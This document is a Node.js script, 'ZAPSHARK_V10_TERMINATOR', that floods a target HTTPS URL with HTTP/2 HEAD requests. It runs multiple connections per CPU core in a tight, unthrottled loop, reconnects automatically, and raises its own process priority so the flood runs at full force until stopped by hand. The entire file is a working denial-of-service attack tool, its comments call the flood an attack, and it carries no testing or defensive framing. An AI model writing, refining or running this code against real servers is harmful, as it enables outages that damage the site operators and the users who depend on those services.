const http2 = require('http2');
const os = require('os');
const { execSync } = require('child_process');

class ZAPSHARK_V10_TERMINATOR {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        
        // CPU CORES - ALL BUT 1
        this.cpuCores = Math.max(1, os.cpus().length - 1);
        
        // MEMORY OPTIMIZED CONNECTIONS
        this.clients = new Array(this.cpuCores * 2); // 2 CONNECTIONS PER CORE
        
        // FIXED ARRAY FOR MEMORY
        this.activeStreams = 0;
        this.streamIds = new Set();
        
        // NO LOGGING INTERVALS
        this.attackLoop = null;
    }

    // === SET CPU AFFINITY ===
    setCPUAffinity() {
        try {
            if (process.platform === 'linux') {
                // SET NICE LEVEL TO MAX PRIORITY
                process.setPriority(-20);
                
                // SET CPU AFFINITY TO ALL BUT 1 CORE
                const cpus = os.cpus().length;
                const mask = (1 << cpus) - 2; // ALL BUT CORE 0
                execSync(`taskset -p ${mask} ${process.pid}`);
            }
        } catch (e) {}
    }

    // === MEMORY OPTIMIZED CONNECTION POOL ===
    initializeConnections() {
        for (let i = 0; i < this.clients.length; i++) {
            this.createConnection(i);
        }
    }

    createConnection(index) {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 16384, // FIXED MEMORY
                maxDeflateDynamicTableSize: 4096,
                peerMaxConcurrentStreams: 500
            });
            
            // MINIMAL EVENT LISTENERS
            client.on('error', () => {
                this.clients[index] = null;
                setTimeout(() => this.createConnection(index), 100);
            });
            
            this.clients[index] = client;
            
        } catch (err) {
            this.clients[index] = null;
            setTimeout(() => this.createConnection(index), 100);
        }
    }

    // === MEMORY SAFE ATTACK ===
    sendRequest() {
        // ROUND ROBIN THROUGH CLIENTS
        for (let i = 0; i < this.clients.length; i++) {
            const client = this.clients[i];
            if (!client) continue;

            // SEND BATCH FROM EACH CLIENT
            for (let s = 0; s < 10; s++) {
                try {
                    const streamId = Math.random();
                    this.streamIds.add(streamId);
                    
                    const req = client.request({
                        ':method': 'HEAD',
                        ':path': '/'
                    });
                    
                    req.on('response', () => {
                        req.destroy();
                        this.streamIds.delete(streamId);
                    });
                    
                    req.on('error', () => {
                        req.destroy();
                        this.streamIds.delete(streamId);
                    });
                    
                    req.on('close', () => {
                        this.totalRequests++;
                        this.streamIds.delete(streamId);
                        
                        // LOG OVERWRITE
                        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
                    });
                    
                    req.end();
                    
                } catch (err) {
                    this.totalRequests++;
                    process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
                }
            }
        }
        
        // MEMORY CLEANUP EVERY 100K REQUESTS
        if (this.totalRequests % 100000 === 0) {
            this.cleanupMemory();
        }
    }

    // === MEMORY LEAK FIX ===
    cleanupMemory() {
        // CLEAN UP STALE STREAMS
        if (this.streamIds.size > 10000) {
            this.streamIds.clear();
        }
        
        // RECYCLE DEAD CONNECTIONS
        for (let i = 0; i < this.clients.length; i++) {
            const client = this.clients[i];
            if (client) {
                try {
                    if (client.destroyed || client.closed) {
                        this.clients[i] = null;
                        this.createConnection(i);
                    }
                } catch (e) {
                    this.clients[i] = null;
                    this.createConnection(i);
                }
            }
        }
    }

    // === MAX POWER LOOP ===
    start() {
        // SET CPU AFFINITY
        this.setCPUAffinity();
        
        // INIT CONNECTIONS
        this.initializeConnections();
        
        // START ATTACK AFTER 2s
        setTimeout(() => {
            // MAXIMUM POSSIBLE LOOP
            const attack = () => {
                this.sendRequest();
                
                // DIRECT RECURSION - NO INTERVAL OVERHEAD
                if (this.attackLoop !== false) {
                    setImmediate(attack);
                }
            };
            
            this.attackLoop = true;
            attack();
            
        }, 2000);
        
        // MANUAL STOP ONLY
        process.on('SIGINT', () => {
            this.attackLoop = false;
            
            for (let client of this.clients) {
                if (client) {
                    try { client.destroy(); } catch (e) {}
                }
            }
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    process.exit(1);
}

// MAX NODE PERFORMANCE
process.env.UV_THREADPOOL_SIZE = os.cpus().length * 2;
if (global.gc) global.gc();

const shark = new ZAPSHARK_V10_TERMINATOR(target);
shark.start();
